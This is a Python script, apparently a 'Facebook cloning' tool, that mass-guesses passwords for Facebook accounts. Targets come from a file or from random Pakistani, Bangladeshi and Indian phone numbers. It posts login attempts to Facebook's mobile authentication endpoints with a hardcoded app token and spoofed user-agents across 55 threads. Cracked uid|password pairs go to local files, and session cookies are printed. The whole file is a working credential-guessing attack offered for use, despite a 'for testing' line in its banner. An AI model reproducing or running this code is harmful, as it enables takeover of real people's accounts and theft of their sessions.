import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
digits = []
okacc = []
cpacc = []

def random_ua():
    return "[FBAN/FB4A;FBAV/395.0.0.27.214;FBBV/426817936;FBDM/{density=1.75,width=720,height=1422};FBLC/en_GB;FBRV/428276664;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q510N;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}==================================================")

def xxx(x):
    return f"{w}[{g}{x}{w}]"

def main():
    logo()
    print(f" {xxx('1')} File Cloning ")
    print(f" {xxx('2')} Random Cloning ")
    print(f" {xxx('3')} Contact with Author ")
    print(f" {xxx('0')} Exit Tools ")
    linex()
    xnxx = input(f" {xxx('?')} Select : ")
    if "1" in xnxx:
        file_clone()
    elif "2" in xnxx:
        r_number()
    elif "3" in xnxx:
        os.system("xdg-open https://www.facebook.com/MR.K4ZIM.404")
        main()
    elif "0" in xnxx:
        linex()
        print(f" {xxx('!')} {g}Thanks For Using Tools ")
        linex()
        sys.exit()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def file_clone():
    logo()
    print(f" {xxx('!')} Use new series file for best results ")
    linex()
    print(f" {xxx('•')} Example : {g}/sdcard/file.txt ")
    linex()
    file = input(f" {xxx('?')} Enter File : ")
    try:
        idz = open(file, "r").read().splitlines()
    except FileNotFoundError:
        linex()
        print(f" {xxx('!')} {r}File not found >> {g}{file} ")
        linex()
        time.sleep(1)
        file_clone()
    logo()
    print(f" {xxx('!')} Maximum Password Limit is {g}10 ")
    linex()
    p_limit = int(input(f" {xxx('?')} Enter Password Limit : "))
    ps_list = []
    logo()
    print(f" {xxx('•')} Example : {g}first123, first1234, first12345 ")
    linex()
    for x in range(p_limit):
        ps_list.append(input(f" {xxx(x+1)} Enter Password : "))
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(idz))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('!')} Process Has Been Started ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for x in idz:
            uid, name = x.split("|")
            pword = ps_list
            process.submit(file_cracker, uid, name, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def r_number():
    logo()
    print(f" {xxx('1')} Pak Cloning ")
    print(f" {xxx('2')} Bd Cloning ")
    print(f" {xxx('3')} India Cloning ")
    linex()
    c = input(f" {xxx('?')} Select : ")
    if "1" in c:
        pak()
    elif "2" in c:
        bd()
    elif "3" in c:
        india()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def pak():
    logo()
    print(f" {xxx('•')} Example : {g}0310, 0320, 0330, 0340 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"pakistan","janjan","king123","kingkhan","malik123","baloch123"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def bd():
    logo()
    print(f" {xxx('•')} Example : {g}016, 017, 018, 019 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love[1:],love,code+love,"i love you","iloveyou","bangladesh","bangladesh123","708090","102030","777000","888000","999000","123456"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def india():
    logo()
    print(f" {xxx('•')} Example : {g}091, 092, 093, 094 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"57273200","59039200"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def file_cracker(uid, name, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[XNXX-XX] [{loop}/{total_idz}] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pword:
            pw = ps.replace("first", first).replace("last", last).replace("name", name).lower()
            ua_string = str(random_ua())
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": uid,
                "password": pw,
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "fb_api_req_friendly_name": "authenticate",
            }
            headers = {
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-Friendly-Name": "authenticate",
                "X-FB-Connection-Type": "unknown",
                "User-Agent": "[FBAN/FB4A;FBAV/399.0.0.37378;FBBV/733757405;FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=2.3,width=870,height=1540};FBLC/en_US;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920S;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                print(f" {g}[ZAMAN-OK] {uid} | {pw}")
                open("/sdcard/ZAMAN-File-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[ZAMAN-CP] {uid} | {pw}")
                open("/sdcard/ZAMAN-File-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def m1(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[ZAMAN-M1] [{loop}/{total_idz}] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = str(random_ua())
            data = {
                "email": uid,
                "password": pw,
                "cpl": "true",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "format": "json",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
            }
            headers = {
                "accept-encoding": "gzip, deflate", 
                "Accept": "*/*", 
                "Connection": "keep-alive", 
                "content-type": "application/x-www-form-urlencoded", 
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", 
                "x-fb-friendly-name": "authenticate", 
                "x-fb-http-engine": "Liger",
                "user-agent": "[FBAN/FB4A;FBAV/120.0.0.58.898;FBBV/363269395;FBDM/{density=2.9,width=1080,height=2160};FBLC/en_GB;FBCR/Marshmallow;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X675;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            }
            url = "https://b-api.facebook.com/method/auth.login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[ZAMAN-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/ZAMAN-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif result["error_code"] == 405:
                print(f" {r}[ZAMAN-CP] {uid} | {pw}")
                open("/sdcard/ZAMAN-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def m2(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[ZAMAN-M2] [{loop}/{total_idz}] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = str(random_ua())
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": uid,
                "password": pw,
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "fb_api_req_friendly_name": "authenticate",
            }
            headers = {
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-Friendly-Name": "authenticate",
                "X-FB-Connection-Type": "unknown",
                "User-Agent": "[FBAN/FB4A;FBAV/399.0.0.37378;FBBV/733757405;FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=2.3,width=870,height=1540};FBLC/en_US;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920S;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                try:
                    uid = result["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[ZAMAN-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/ZAMAN-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                try:
                    uid = result["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f" {r}[ZAMAN-CP] {uid} | {pw}")
                open("/sdcard/ZAMAN-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\

{g}d88888D  .d8b.  .88b  d88.  .d8b.  d8b   db 
{b}YP  d8' d8' `8b 88'YbdP`88 d8' `8b 888o  88 
{p}   d8'  88ooo88 88  88  88 88ooo88 88V8o 88 
{w}  d8'   88~~~88 88  88  88 88~~~88 88 V8o88 
{y} d8' db 88   88 88  88  88 88   88 88  V888 
{g}d88888P YP   YP YP  YP  YP YP   YP VP   V8P 
{w}==================================================
{w}[•] AUTHOR       : ZAMAN 
{w}[•] STYLE        : BSCS STUDENT
[•] FaceBook     : ZAMAN SINDHI 
[•] Version      : {w}9.1
{p}4G/3G full speed internet  Update Coming Soon
This tool make for testing please Feedback
{w}==================================================
\33[37;41m\t RENDOM METHOD 1 AND 2 BOTH WORKING\33[0;m
{w}==================================================\
"""

if __name__ == "__main__":     
    os.system("clear")
    print(f" {xxx('!')} Update Done 👍  ")
    time.sleep(2)
    main()